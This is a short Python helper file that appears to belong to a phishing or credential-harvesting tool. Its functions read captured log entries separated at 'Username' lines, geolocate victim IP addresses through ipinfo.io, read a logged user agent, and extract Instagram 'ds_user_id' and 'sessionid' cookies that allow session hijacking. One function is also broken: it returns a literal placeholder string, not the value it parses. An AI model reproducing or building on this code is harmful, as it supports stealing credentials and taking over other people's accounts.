import requests
import json

def capture_information(filename, n):
    with open(filename, 'r') as f:
        lines = f.readlines()
    last_lines = lines[-n:]
    filtered_lines =  [line for line in last_lines if line.strip()]
    filtered_lines_str = ""
    for line in filtered_lines:
        if "Username" in line:
            filtered_lines_str += "--------------------------------------\n"
        filtered_lines_str += line 
    filtered_lines_str += "--------------------------------------"
    return filtered_lines_str


def get_location(ip_address):
    response = requests.get(f"https://ipinfo.io/{ip_address}/json")
    data = response.json()
    return data

def set_agent():
    file_path = 'output/ip_agent.log'
    with open(file_path, 'r') as file:
        lines = file.readlines()
    last_line = lines[-1:]
    user_agent =  last_line[0].split(": ", 1)[1]

    return f"\"user_agent\""


def edit_cookies(cookies):
    cookies = json.loads(cookies)
    new_cookies =  f"\nds_user_id: {cookies['ds_user_id']}\nsessionid: {cookies['sessionid']}"
    return new_cookies

